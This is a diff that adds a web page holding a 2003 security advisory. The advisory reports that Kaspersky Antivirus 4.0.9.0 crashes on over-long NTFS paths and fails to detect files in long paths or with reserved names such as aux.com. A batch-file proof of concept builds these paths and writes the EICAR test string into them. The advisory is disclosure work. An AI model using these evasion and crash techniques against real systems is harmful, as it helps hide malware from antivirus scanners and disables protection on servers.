@@ -1,0 +1,86 @@
+#define Title "Advisories : Kaspersky Antivirus DoS"
+#include "../include/intro.html"
+<pre><font class="fixed">
+
+Title:                     Kaspersky Antivirus DoS
+Author:                    ZARAZA &lt;3APA3A@SECURITY.NNOV.RU&gt;
+Affected:                  Kaspersky  Antivirus 4.0.9.0
+                           (Server and Workstation version on
+                           Windows NT 4.0 and Windows 2000).
+Vendor:                    Kaspersky Lab
+Date:                      January, 30 2003
+Risk:                      Average
+Exploitable:               Yes
+Remote:                    Yes (for server versions)
+Vendor Notified:           January, 30 2003
+
+I. Introduction:
+
+Kaspersky   Antivirus   (KAV)   is  a  family  of  antiviral  products.
+
+II. Vulnerability:
+
+Few  vulnerabilities  were identified. Most serious allows user to crash
+antiviral  server  remotely  (write  access  to  any directory on remote
+server is required).
+
+1. Long path crash
+2. Long path prevents malware from detection
+3. Special name prevents malware from detection
+
+III. Details:
+
+1. Long path crash
+
+NTFS  file system allows to create paths of almost unlimited length. But
+Windows  API  does  not  allow  path  longer  than 256 bytes. To prevent
+Windows  API  from  checking  requested  path \\?\ prefix may be used to
+filename.  This  is documented feature of Windows API. Paths longer than
+256 characters will cause KAV monitor service to crash or hang with 100%
+CPU usage. Possibility of code execution is not researched.
+
+2. Long path prevents malware from detection
+
+Long path will also prevent malware from detection by antiviral scanner.
+
+3. Special name prevents malware from detection
+
+It's  possible  to  create  NTFS file with name like aux.vbs or aux.com.
+Malware in this file will not be detected.
+
+IV. Exploit:
+
+This .bat file demonstrates vulnerability.
+
+1,2 Long path crash & Long path prevents malware from detection
+
+@echo off
+SET A=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+mkdir \\?\c:\%A%
+mkdir \\?\c:\%A%\%A%
+mkdir \\?\c:\%A%\%A%\%A%
+mkdir \\?\c:\%A%\%A%\%A%\%A%
+mkdir \\?\c:\%A%\%A%\%A%\%A%\%A%
+mkdir \\?\c:\%A%\%A%\%A%\%A%\%A%\%A%
+echo X5O!P%%@AP[4\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* &gt;\\?\c:\%A%\%A%\%A%\%A%\%A%\%A%\%A%.com
+
+3. Special name prevents malware from detection
+
+echo X5O!P%%@AP[4\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* &gt;\\?\c:\aux.com
+
+V. Vendor
+
+No response from vendor.
+
+-- 
+http://www.security.nnov.ru
+         /\_/\
+        { , . }     |\
++--oQQo->{ ^ }<-----+ \
+|  ZARAZA  U  3APA3A   }
++-------------o66o--+ /
+                    |/
+You know my name - look up my number (The Beatles)
+</pre></font>
+
+#include "../include/postpage.html"
